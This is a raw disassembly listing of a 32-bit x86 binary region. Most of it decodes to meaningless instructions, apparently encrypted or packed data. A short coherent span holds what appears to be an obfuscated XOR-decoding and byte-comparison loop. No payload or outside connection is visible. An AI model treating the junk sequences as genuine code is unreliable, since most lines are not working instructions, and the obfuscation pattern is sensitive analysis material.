  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	jb     0x40496a
  4049bd:	repnz dec esi
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x9970707d
  4049c8:	ins    BYTE PTR es:[edi],dx
  4049c9:	inc    edx
  4049ca:	adc    ecx,DWORD PTR [edi]
  4049cc:	dec    edx
  4049cd:	xchg   esi,eax
  4049ce:	int3   
  4049cf:	sub    eax,0xa770cee8
  4049d4:	jle    0x404a4f
  4049d6:	xchg   ebx,eax
  4049d7:	pushf  
  4049d8:	jle    0x404a0b
  4049da:	fcom   st(1)
  4049dc:	fstp   DWORD PTR [ebx]
  4049de:	clc    
  4049df:	sub    cl,BYTE PTR [ebx+0x4]
  4049e2:	xchg   esp,eax
  4049e3:	(bad)  
  4049e4:	mov    ds:0x743cb8fd,eax
  4049e9:	call   0x26f0:0x7ddb91bc
  4049f0:	loope  0x404a10
  4049f2:	push   0xd90c2b5e
  4049f7:	pop    es
  4049f8:	push   edx
  4049f9:	(bad)  
  4049fa:	mov    ds:0xba744386,eax
  4049ff:	je     0x4049de
  404a01:	pop    es
  404a02:	xor    edx,edi
  404a04:	aam    0x70
  404a06:	jns    0x4049c4
  404a08:	jae    0x404a55
  404a0a:	(bad)  [edx-0x2b8223dc]
  404a10:	jbe    0x4049e2
  404a12:	cli    
  404a13:	push   edx
  404a14:	in     al,dx
  404a15:	test   bh,dl
  404a17:	mov    eax,ds:0x589a3fa5
  404a1c:	xchg   edi,eax
  404a1d:	adc    ecx,ecx
  404a1f:	fmul   QWORD PTR [edx-0x8c7533]
  404a25:	arpl   WORD PTR [ecx],cx
  404a27:	dec    edi
  404a28:	fisttp WORD PTR [esi+0x6f795492]
  404a2e:	outs   dx,BYTE PTR ds:[esi]
  404a2f:	push   ds
  404a30:	inc    esi
  404a31:	add    edi,DWORD PTR [edi+0x73220f08]
  404a37:	retf   0xaa9d
  404a3a:	imul   ecx,DWORD PTR [ecx+0x38d5fc57],0xeca3f1fd
  404a44:	mov    esi,0xcf31ab2c
  404a49:	hlt    
  404a4a:	add    BYTE PTR [esi+0x26cb0718],al
  404a50:	pop    ebp
  404a51:	push   es
  404a52:	cmp    BYTE PTR [esi],0x4d
  404a55:	cmp    BYTE PTR [esi-0x57706234],bh
  404a5b:	mov    ebx,0x1b307b92
  404a60:	xor    eax,DWORD PTR [esi-0x5f]
  404a63:	xrelease mov DWORD PTR [eax],esp
  404a66:	push   edi
  404a67:	mov    ch,0x25
  404a69:	mov    eax,ds:0x981c469
  404a6e:	rcl    ebx,0x6e
  404a71:	cmc    
  404a72:	out    dx,al
  404a73:	jo     0x404a10
  404a75:	mov    ch,ch
  404a77:	ja     0x404a59
  404a79:	and    ebp,DWORD PTR [ecx+0x217dac52]
  404a7f:	add    BYTE PTR [ecx-0x4eac812f],ch
  404a85:	cs in  eax,0x98
  404a88:	mov    eax,ds:0x59107641
  404a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a8e:	mov    edi,DWORD PTR ds:0x9975cd80
  404a94:	in     eax,0xbf
  404a96:	int3   
  404a97:	xchg   ecx,eax
  404a98:	xchg   esp,eax
  404a99:	out    0xcd,eax
  404a9b:	sub    al,0xbc
  404a9d:	sub    al,0x1d
  404a9f:	iret   
  404aa0:	shr    DWORD PTR [ebx],cl
  404aa2:	shr    DWORD PTR [ebx],0x3
  404aa5:	pop    es
  404aa6:	push   esp
  404aa7:	add    BYTE PTR [ebp-0x16f5d13b],0xfc
  404aae:	cmp    ch,al
  404ab0:	jmp    0xb5b9df7b
  404ab5:	xchg   esi,eax
  404ab6:	xchg   ebx,eax
  404ab7:	iret   
  404ab8:	mov    ebp,DWORD PTR [ecx]
  404aba:	xchg   ecx,eax
  404abb:	int3   
  404abc:	mov    WORD PTR [esi],fs
  404abe:	xor    al,0xc
  404ac0:	outs   dx,BYTE PTR ds:[esi]
  404ac1:	mov    ebp,0xdb7f8622
  404ac6:	repz mov esi,0x8b9adf76
  404acc:	imul   ebp,DWORD PTR [esi-0x4d],0xe5d1a5fa
  404ad3:	or     DWORD PTR [edi+0x21],0x4c5c755b
  404ada:	packsswb mm2,mm4
  404add:	(bad)  
  404ade:	fcmovbe st,st(0)
  404ae0:	jae    0x404b30
  404ae2:	ss hlt 
  404ae4:	add    BYTE PTR [esi-0x28],0xa1
  404ae8:	adc    DWORD PTR [edx+0x32],esp
  404aeb:	gs mov cl,0x4d
  404aee:	lahf   
  404aef:	mov    ah,0xb0
  404af1:	test   eax,0xed761902
  404af6:	add    DWORD PTR [edx],0x6
  404af9:	mov    ds,edx
  404afb:	push   edi
  404afc:	in     eax,dx
  404afd:	dec    edi
  404afe:	dec    ecx
  404aff:	jae    0x404a84
  404b01:	call   0xd141:0x56dad37
  404b08:	sbb    al,0xdd
  404b0a:	inc    edi
  404b0b:	sub    BYTE PTR [edi],0xc7
  404b0e:	push   ebp
  404b0f:	clc    
  404b10:	push   esp
  404b11:	lods   eax,DWORD PTR ds:[esi]
  404b12:	shr    DWORD PTR [esi],cl
  404b14:	pop    ecx
  404b15:	dec    esp
  404b16:	jns    0x404b69
  404b18:	pop    edx
  404b19:	in     al,0x9d
  404b1b:	popa   
  404b1c:	shr    esp,0xa5
  404b1f:	das    
  404b20:	mov    esi,0x1dd2b5fe
  404b25:	push   0xd9110515
  404b2a:	cs jno 0x404ba9
  404b2d:	xchg   edx,eax
  404b2e:	xor    esi,edi
  404b30:	and    al,0x79
  404b32:	cmp    esp,ebx
  404b34:	sbb    ah,BYTE PTR [esi+0x79293ae1]
  404b3a:	xchg   ebx,eax
  404b3b:	sbb    DWORD PTR [ebp-0x41],0x9dfd9e66
  404b42:	jno    0x404b7b
  404b44:	mov    dh,0x44
  404b46:	js     0x404b80
  404b48:	push   cs
  404b49:	js     0x404b95
  404b4b:	xchg   esp,eax
  404b4c:	adc    ecx,DWORD PTR [esi]
  404b4e:	mov    ebp,0x279ce7dc
  404b53:	inc    eax
  404b54:	fs or  al,0xc2
  404b57:	sub    eax,0xb6002e71
  404b5c:	mov    ds:0x597ec6c9,al
  404b61:	int3   
  404b62:	cld    
  404b63:	arpl   sp,bx
  404b65:	push   esp
  404b66:	pop    ebp
  404b67:	(bad)  
  404b69:	inc    esp
  404b6a:	shr    bl,0x9b
  404b6d:	xor    al,0xb3
  404b6f:	(bad)  
  404b71:	ror    BYTE PTR [ecx+0x50],cl
  404b74:	and    cl,BYTE PTR [edi-0x6f]
  404b77:	mov    ds:0x5644064d,al
  404b7c:	sbb    eax,edi
  404b7e:	outs   dx,DWORD PTR ds:[esi]
  404b7f:	(bad)  
  404b80:	or     bh,BYTE PTR ds:0xccd2f855
  404b86:	sbb    DWORD PTR [edx],eax
  404b88:	icebp  
  404b89:	adc    eax,0x2168b5d7
  404b8e:	jmp    0xbfe30224
  404b93:	push   esp
  404b94:	cmp    eax,DWORD PTR [ecx+ebx*4]
  404b97:	loop   0x404ba8
  404b99:	xlat   BYTE PTR ds:[ebx]
  404b9a:	pop    ebp
  404b9b:	push   eax
  404b9c:	pop    edi
  404b9d:	xchg   esi,eax
  404b9e:	mov    eax,0xeae69b0
  404ba3:	cmp    cl,BYTE PTR [edi+0x66a25e70]
  404ba9:	sub    eax,0x81351a66
  404bae:	xor    dl,bh
  404bb0:	ret    0x33d0
  404bb3:	xchg   ebp,eax
  404bb4:	outs   dx,DWORD PTR cs:[esi]
  404bb6:	out    0x7b,eax
  404bb8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bba:	test   BYTE PTR [bp+di+0x7],ch
  404bbe:	aad    0xee
  404bc0:	xchg   ebp,eax
  404bc1:	test   ecx,ebp
  404bc3:	push   esi
  404bc4:	ret    
  404bc5:	pusha  
  404bc6:	push   esi
  404bc7:	pusha  
  404bc8:	mov    dl,0x4e
  404bca:	loopne 0x404bb4
  404bcc:	jecxz  0x404b92
  404bce:	mov    eax,ds:0xa16e25f
  404bd3:	jne    0x404b61
  404bd5:	mov    ebx,ds
  404bd7:	std    
  404bd8:	int    0xdd
  404bda:	mov    ebp,0x1a4a3422
  404bdf:	in     eax,dx
  404be0:	adc    al,0x32
  404be2:	inc    ecx
  404be3:	fcomp  DWORD PTR [eax+eiz*8+0x27767b8c]
  404bea:	or     al,0x28
  404bec:	jle    0x404c0a
  404bee:	and    al,0x38
  404bf0:	sub    ebx,edx
  404bf2:	js     0x404c18
  404bf4:	inc    esi
  404bf5:	jmp    0x404b92
  404bf7:	das    
  404bf8:	(bad)  
  404bf9:	repnz stos DWORD PTR es:[edi],eax
  404bfb:	jmp    0x404bf9
  404bfd:	imul   esp,DWORD PTR [ecx+eiz*1-0x335d6733],0x96ec8661
  404c08:	adc    eax,0xac395908
  404c0d:	lahf   
  404c0e:	xchg   ebp,eax
  404c0f:	xchg   esi,eax
  404c10:	imul   eax,DWORD PTR [edi],0x86bc9fea
  404c16:	xchg   ebx,eax
  404c17:	sbb    eax,0x1e522445
  404c1c:	ret    0xde4b
  404c1f:	scas   eax,DWORD PTR es:[edi]
  404c20:	jno    0x404c2d
  404c22:	sbb    cl,BYTE PTR [edi-0x30]
  404c25:	mov    eax,ds:0xaf4097c2
  404c2a:	scas   eax,DWORD PTR es:[edi]
  404c2b:	jge    0x404c4d
  404c2d:	cld    
  404c2e:	jl     0x404c7b
  404c30:	xchg   ebp,eax
  404c31:	cld    
  404c32:	in     eax,dx
  404c33:	ins    DWORD PTR es:[edi],dx
  404c34:	scas   eax,DWORD PTR es:[edi]
  404c35:	sbb    eax,0x2851f79f
  404c3a:	cli    
  404c3b:	shl    DWORD PTR [ebx+0x46510716],cl
  404c41:	and    bl,bl
  404c43:	push   ebp
  404c44:	push   ebp
  404c45:	push   ebp
  404c46:	push   eax
  404c47:	fisttp DWORD PTR [edx-0x72fe3483]
  404c4d:	imul   eax,DWORD PTR [ecx+0x11ed96e1],0x6c68f8a8
  404c57:	(bad)  
  404c58:	(bad)  
  404c59:	mov    al,ds:0x28f2bd71
  404c5e:	pop    esp
  404c5f:	jl     0x404c2a
  404c61:	inc    esi
  404c62:	mov    esp,0xe671f25d
  404c67:	stos   DWORD PTR es:[edi],eax
  404c68:	mov    al,0x58
  404c6a:	outs   dx,BYTE PTR gs:[esi]
  404c6c:	dec    eax
  404c6d:	(bad)  
  404c6e:	ins    DWORD PTR es:[edi],dx
  404c6f:	and    esi,edi
  404c71:	(bad)  
  404c72:	rol    al,1
  404c74:	and    ch,ch
  404c76:	outs   dx,DWORD PTR ds:[esi]
  404c77:	ret    0x789a
  404c7a:	dec    ax
  404c7c:	sub    DWORD PTR [esi+0x67],esp
  404c7f:	push   esi
  404c80:	push   esp
  404c81:	jae    0x404c86
  404c83:	jns    0x404c82
  404c85:	xor    al,0x10
  404c87:	push   ebp
  404c88:	add    eax,eax
  404c8a:	ins    DWORD PTR es:[edi],dx
  404c8b:	loope  0x404cd1
  404c8d:	rdtsc  
  404c8f:	aad    0x71
  404c91:	repz xchg ebp,eax
  404c93:	mov    dl,ch
  404c95:	cmp    al,0x54
  404c97:	push   0x69
  404c99:	int3   
  404c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c9b:	sti    
  404c9c:	jmp    0x404cff
  404c9e:	dec    edi
  404c9f:	sub    al,BYTE PTR [ebx]
  404ca1:	cmp    al,0xaa
  404ca3:	js     0x404c43
  404ca5:	or     cl,BYTE PTR [esi+esi*4-0x17]
  404ca9:	or     ecx,DWORD PTR [edx+esi*1+0x113e7aae]
  404cb0:	imul   ebp,DWORD PTR [edi],0x79
  404cb3:	dec    ecx
  404cb4:	sub    eax,0xfefcf06d
  404cb9:	xor    eax,esp
  404cbb:	or     edi,DWORD PTR [eax-0x13]
  404cbe:	sub    edx,DWORD PTR [eax+0x201a9de8]
  404cc4:	fiadd  DWORD PTR [ecx+0x5d]
  404cc7:	xor    eax,0xa9da52b
  404ccc:	enter  0x491d,0xff
  404cd0:	in     eax,dx
  404cd1:	xlat   BYTE PTR ds:[ebx]
  404cd2:	pop    edi
  404cd3:	addr16 push ebp
  404cd5:	inc    eax
  404cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cd7:	pop    edx
  404cd8:	lods   eax,DWORD PTR ds:[esi]
  404cd9:	dec    eax
  404cda:	cwde   
  404cdb:	ds jbe 0x404d04
  404cde:	xchg   DWORD PTR [edx+0x73],edi
  404ce1:	mov    ecx,0x343c513c
  404ce6:	sbb    DWORD PTR [ebx-0x1b9535a4],0xffffff85
  404ced:	ins    DWORD PTR es:[edi],dx
  404cee:	lods   eax,DWORD PTR ds:[esi]
  404cef:	cdq    
  404cf0:	sbb    DWORD PTR [ecx-0x5b0df5e6],edx
  404cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cf7:	mov    ch,0x5
  404cf9:	mov    eax,0xb72ed664
  404cfe:	cmp    BYTE PTR [eax-0x27418c16],bh
  404d04:	in     eax,dx
  404d05:	retf   0x4acd
  404d08:	jne    0x404ca6
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e77f,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e76b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x1b]
  404d39:	pop    esi
  404d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xf870707d
  404d45:	pop    es
  404d46:	in     eax,0xfe
  404d48:	add    eax,DWORD PTR [ecx+0xc1bc7be]
  404d4e:	mov    bl,0x79
  404d50:	jmp    0xe6ae:0x3337c652
  404d57:	cdq    
  404d58:	sbb    ah,0x26
  404d5b:	jl     0x404cf3
  404d5d:	loop   0x404d5f
  404d5f:	loope  0x404d5a
  404d61:	outs   dx,DWORD PTR ds:[esi]
  404d62:	xor    eax,0x31e04570
  404d67:	mov    ebp,0x981f63bf
  404d6c:	nop
  404d6d:	mov    ecx,0xa2aebf6c
  404d72:	out    dx,al
  404d73:	or     esi,DWORD PTR [di-0xaf2]
  404d78:	adc    eax,0xc5370b3
  404d7d:	out    dx,eax
  404d7e:	jns    0x404d07
  404d80:	sub    dl,BYTE PTR [ebx+0x202eb87]
  404d86:	lods   eax,DWORD PTR ds:[esi]
  404d87:	fsub   QWORD PTR [ebx+edx*8]
  404d8a:	div    dl
  404d8c:	ja     0x404d8c
  404d8e:	push   ds
  404d8f:	adc    esp,eax
  404d91:	loop   0x404e11
  404d93:	jp     0x404db2
  404d95:	sahf   
  404d96:	dec    eax
  404d97:	clc    
  404d98:	cmp    al,0x75
  404d9a:	lods   eax,DWORD PTR ds:[esi]
  404d9b:	adc    BYTE PTR [edx],al
  404d9d:	push   0x990e179b
  404da2:	inc    esp
  404da3:	fbld   TBYTE PTR [esi]
  404da6:	das    
  404da7:	js     0x404dcf
  404da9:	add    ah,BYTE PTR [ebx+0x4704735d]
  404daf:	push   eax
  404db0:	dec    ebp
  404db1:	outs   dx,BYTE PTR ds:[esi]
  404db2:	pop    ss
  404db3:	lock aam 0xc4
  404db6:	sub    eax,0x50e6f57f
  404dbb:	ins    DWORD PTR es:[edi],dx
  404dbc:	lock fsubr DWORD PTR [edi+0x57]
  404dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dc1:	push   edi
  404dc2:	mov    cl,0x4e
  404dc4:	inc    ebx
  404dc5:	fild   DWORD PTR [edi+0x1]
  404dc8:	sti    
  404dc9:	addr16 test al,0x29
  404dcc:	stc    
  404dcd:	or     eax,0x8cfbfe6f
  404dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dd3:	(bad)  
  404dd4:	in     al,dx
  404dd5:	inc    ebp
  404dd6:	mov    ch,0x18
  404dd8:	and    eax,0x8b5c6b5a
  404ddd:	scas   eax,DWORD PTR es:[edi]
  404dde:	add    eax,0xb2b381d1
  404de3:	pop    ebp
  404de4:	push   0xc5ab2e00
  404de9:	sbb    ecx,DWORD PTR [ebx]
  404deb:	add    al,0x6f
  404ded:	jmp    0x404d92
  404def:	shr    esp,1
  404df1:	enter  0x4be,0xd5
  404df5:	jg     0x404e61
  404df7:	mov    dl,0x10
  404df9:	repz clc 
  404dfb:	dec    edx
  404dfc:	leave  
  404dfd:	and    eax,0x5d0f3aa0
  404e02:	sub    DWORD PTR [ebx],esi
  404e04:	test   eax,0x98e164e2
  404e09:	cmp    bl,BYTE PTR [ecx+ebp*1-0x5c2bc7d3]
  404e10:	cli    
  404e11:	fsubr  DWORD PTR [edi-0x3a2245f8]
  404e17:	div    BYTE PTR [esi]
  404e19:	dec    esp
  404e1a:	iret   
  404e1b:	pop    edx
  404e1c:	sub    DWORD PTR [eax+edi*4],edx
  404e1f:	mov    al,0x95
  404e21:	push   ebp
  404e22:	imul   ecx,edi,0xffffffdb
  404e25:	clc    
  404e26:	dec    ecx
  404e27:	jo     0x404e9d
  404e29:	push   0xbd2e911a
  404e2e:	adc    ah,bh
  404e30:	out    dx,al
  404e31:	mov    bl,0x2a
  404e33:	in     eax,dx
  404e34:	rol    DWORD PTR [ebx+eax*2-0x60ad00d5],cl
  404e3b:	or     ecx,eax
  404e3d:	aas    
  404e3e:	test   al,0x8e
  404e40:	lods   al,BYTE PTR ds:[esi]
  404e41:	arpl   bx,di
  404e43:	fwait
  404e44:	test   al,0xbb
  404e46:	cmp    DWORD PTR [esp+ebx*4-0xb2aaa80],eax
  404e4d:	and    BYTE PTR [ecx+0x1a1d3547],ah
  404e53:	cmp    al,0x1c
  404e55:	jnp    0x404dd8
  404e57:	in     al,0xd3
  404e59:	add    BYTE PTR ds:0x85954416,ch
  404e5f:	push   esi
  404e60:	daa    
  404e61:	sti    
  404e62:	jge    0x404ee0
  404e64:	rol    edi,1
  404e66:	lock std 
  404e68:	cld    
  404e69:	dec    eax
  404e6a:	imul   esi,eax,0xec7bb75d
  404e70:	or     DWORD PTR [esi+0x12fc9191],edi
  404e76:	xchg   ebx,eax
  404e77:	pushf  
  404e78:	xor    BYTE PTR [eax],ah
  404e7a:	(bad)  
  404e7b:	adc    DWORD PTR [ebp+0x7839416c],ebp
  404e81:	jne    0x404ec4
  404e83:	pusha  
  404e84:	cmp    al,ah
  404e86:	outs   dx,DWORD PTR ds:[esi]
  404e87:	test   al,0xc5
  404e89:	mov    dl,0xa0
  404e8b:	push   ss
  404e8c:	cmp    bh,al
  404e8e:	loop   0x404e9a
  404e90:	fs (bad) 
  404e92:	retf   
  404e93:	push   esp
  404e94:	into   
  404e95:	jl     0x404e8c
  404e97:	push   es
  404e98:	inc    edi
  404e99:	dec    eax
  404e9a:	outs   dx,BYTE PTR ds:[esi]
  404e9b:	int    0x12
  404e9d:	(bad)  
  404e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9f:	test   BYTE PTR [edx],0x37
  404ea2:	pop    es
  404ea3:	jge    0x404f15
  404ea5:	shrd   DWORD PTR [esi+0x50effb9b],edx,cl
  404eac:	adc    BYTE PTR [ebx],ah
  404eae:	fbstp  TBYTE PTR [eax-0x5f06d32c]
  404eb4:	lods   al,BYTE PTR ds:[esi]
  404eb5:	aas    
  404eb6:	xor    al,0x65
  404eb8:	ins    BYTE PTR es:[edi],dx
  404eb9:	xor    edi,esi
  404ebb:	mov    edi,0xa4230de0
  404ec0:	xchg   ebp,eax
  404ec1:	push   ebx
  404ec2:	in     al,dx
  404ec3:	fs pop ebx
  404ec5:	out    dx,eax
  404ec6:	data16 jnp 0x404eae
  404ec9:	loope  0x404ea9
  404ecb:	xchg   edx,eax
  404ecc:	xchg   DWORD PTR [edx-0x3ec45060],esi
  404ed2:	aad    0x6
  404ed4:	adc    eax,0xe4feb748
  404ed9:	mov    esp,0x879f12a0
  404ede:	retf   0xfa3b
  404ee1:	add    eax,0xf0d24b52
  404ee6:	fwait
  404ee7:	dec    ecx
  404ee8:	push   ds
  404ee9:	dec    esi
  404eea:	mov    eax,0xefc70cb6
  404eef:	popa   
  404ef0:	pop    ecx
  404ef1:	jle    0x404f4e
  404ef3:	fdecstp 
  404ef5:	mov    edi,0x6bdfe5a0
  404efa:	cdq    
  404efb:	retf   0x3c11
  404efe:	pop    ebx
  404eff:	test   eax,0x86793356
  404f04:	and    ah,BYTE PTR [edx+0x3eb379a6]
  404f0a:	rol    edx,0x1a
  404f0d:	inc    ebx
  404f0e:	jg     0x404eb1
  404f10:	mov    ebx,0xcce8d935
  404f15:	(bad)  
  404f16:	sub    dh,ah
  404f18:	test   eax,0x72ae2152
  404f1d:	outs   dx,BYTE PTR ds:[esi]
  404f1e:	mov    ah,al
  404f20:	mov    gs,WORD PTR [esi]
  404f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f23:	sub    ebp,DWORD PTR [eax+0x6151b4f8]
  404f29:	sbb    bh,dl
  404f2b:	adc    BYTE PTR [ecx],bl
  404f2d:	lods   eax,DWORD PTR ds:[esi]
  404f2e:	shl    DWORD PTR [eax+0x41],0xbf
  404f32:	mov    cl,0x16
  404f34:	out    0x89,eax
  404f36:	inc    ebp
  404f37:	mov    ebx,0x95920e6e
  404f3c:	ja     0x404ef1
  404f3e:	call   0xd0e8:0x7d292a08
  404f45:	adc    al,0xa2
  404f47:	pop    ebp
  404f48:	sahf   
  404f49:	cmp    BYTE PTR [ebx],bh
  404f4b:	xor    eax,0xebb2b202
  404f50:	mov    eax,ds:0xf1953bfc
  404f55:	mov    bl,0x73
  404f57:	retf   0xb96d
  404f5a:	cmc    
  404f5b:	adc    dh,bl
  404f5d:	mov    al,0x40
  404f5f:	sub    ch,ah
  404f61:	xchg   edx,eax
  404f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f63:	xor    DWORD PTR [edx],esi
  404f65:	ss ins BYTE PTR es:[edi],dx
  404f67:	mov    esi,edx
  404f69:	mov    ecx,0x7041abc8
  404f6e:	mov    dl,0x12
  404f70:	int    0x71
  404f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f73:	fs jge 0x404f48
  404f76:	nop
  404f77:	(bad)  
  404f78:	mov    cl,0x8c
  404f7a:	inc    ebp
  404f7b:	test   DWORD PTR [eax],ecx
  404f7d:	popa   
  404f7e:	pop    es
  404f7f:	repz jnp 0x404feb
  404f82:	pushf  
  404f83:	ror    BYTE PTR [ebp-0x2f],1
  404f86:	outs   dx,BYTE PTR ds:[esi]
  404f87:	pop    ss
  404f88:	loope  0x404fec
  404f8a:	cmovo  esi,DWORD PTR [ebp-0x7e]
  404f8e:	mov    eax,ds:0x20d2ce57
  404f93:	ret    0x1e77
  404f96:	loop   0x404f62
  404f98:	push   ebx
  404f99:	leave  
  404f9a:	mov    esi,0x70c164f6
  404f9f:	sbb    al,0x1d
  404fa1:	(bad)  
  404fa2:	xchg   esp,eax
  404fa3:	mov    eax,ds:0xeffaa2a
  404fa8:	mov    edi,0x54caa584
  404fad:	mov    BYTE PTR [ebx+eax*4],dh
  404fb0:	test   eax,0x1f053acb
  404fb5:	lahf   
  404fb6:	and    BYTE PTR [ecx],0x1d
  404fb9:	push   ss
  404fba:	mov    esp,0xd521d161
  404fbf:	xor    bl,BYTE PTR [edx-0x7b]
  404fc2:	mov    al,ds:0x40aa05e6
  404fc7:	loopne 0x40501c
  404fc9:	mov    ah,0x20
  404fcb:	dec    ebp
  404fcc:	cld    
  404fcd:	dec    eax
  404fce:	xchg   ecx,eax
  404fcf:	mov    al,ds:0xd5288cd2
  404fd4:	sub    dl,bl
  404fd6:	test   eax,0xf46d0637
  404fdb:	fcmovne st,st(3)
  404fdd:	adc    al,0xec
  404fdf:	ret    
  404fe0:	ds jmp 0x405016
  404fe3:	xchg   edi,eax
  404fe4:	push   es
  404fe5:	jae    0x40503e
  404fe7:	pop    eax
  404fe8:	(bad)  
  404fea:	jnp    0x404fac
  404fec:	lds    eax,FWORD PTR [edx]
  404fee:	mov    BYTE PTR [eax],dl
  404ff0:	push   ebp
  404ff1:	inc    ebx
  404ff2:	mov    ebx,0xa89c2816
  404ff7:	mov    ecx,0xbf7011cc
  404ffc:	int    0x62
  404ffe:	xor    DWORD PTR [edx+edi*1+0x23],ecx
  405002:	mov    esp,0x1d0db8e4
  405007:	cli    
  405008:	adc    ecx,ecx
  40500a:	retf   0x22cc
  40500d:	sbb    al,0x26
  40500f:	leave  
  405010:	jmp    0x9208:0x4c21c4ac
  405017:	cmp    al,0xcf
  405019:	sbb    DWORD PTR [esi-0x72ae3173],ebp
  40501f:	jmp    0xf56d4b94
  405024:	dec    esi
  405025:	xchg   ecx,edi
  405027:	push   0xe393f99f
  40502c:	loopne 0x404fe6
  40502e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40502f:	mov    ebp,DWORD PTR [esi]
  405031:	in     eax,dx
  405032:	sub    bl,cl
  405034:	mov    eax,ds:0xec8662d4
  405039:	lods   al,BYTE PTR ds:[esi]
  40503a:	adc    al,0x61
  40503c:	push   es
  40503d:	(bad)  
  40503e:	fdivr  DWORD PTR [esi-0x24af93c4]
  405044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405045:	jne    0x4050c4
  405047:	adc    BYTE PTR [edx],cl
  405049:	xchg   ecx,eax
  40504b:	frstor [edi]
  40504d:	dec    ebx
  40504e:	inc    esi
  40504f:	imul   eax,DWORD PTR [ebx-0x1028cb4b],0xd4eaa732
  405059:	adc    BYTE PTR ds:[ebx+0x4a652dbd],0x2b
  405061:	sub    ecx,DWORD PTR [edx-0x12]
  405064:	mov    al,ds:0xed80e0ad
  405069:	fld    TBYTE PTR [edi]
  40506b:	xchg   edx,eax
  40506c:	lods   eax,DWORD PTR ds:[esi]
  40506d:	call   ecx
  40506f:	cmc    
  405070:	and    eax,0x2bc4019
  405075:	xchg   edx,eax
  405076:	add    eax,0xa8d460c2
  40507b:	jle    0x4050cd
  40507d:	inc    ecx
  40507e:	das    
  40507f:	retf   0x8da5
  405082:	cmp    BYTE PTR [ecx-0x74761205],0x45
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rol    DWORD PTR [ebx+eax*8+0x2b53506b],0x70
  405138:	jo     0x405177
  40513a:	jge    0x4051ac
  40513c:	jo     0x405145
  40513e:	mov    esi,0xf3172d19
  405143:	xchg   esi,eax
  405144:	icebp  
  405145:	int3   
  405146:	(bad)  
  405147:	ins    DWORD PTR es:[edi],dx
  405148:	pop    ebp
  405149:	pop    es
  40514a:	add    BYTE PTR [ebx-0x15],0x54
  40514e:	stos   DWORD PTR es:[edi],eax
  40514f:	out    dx,al
  405150:	adc    bh,BYTE PTR [ebx]
  405152:	jp     0x405139
  405154:	bound  edi,QWORD PTR [eax]
  405156:	hlt    
  405157:	cli    
  405158:	xor    dh,BYTE PTR [eax-0x4cf873ed]
  40515e:	test   al,0xc3
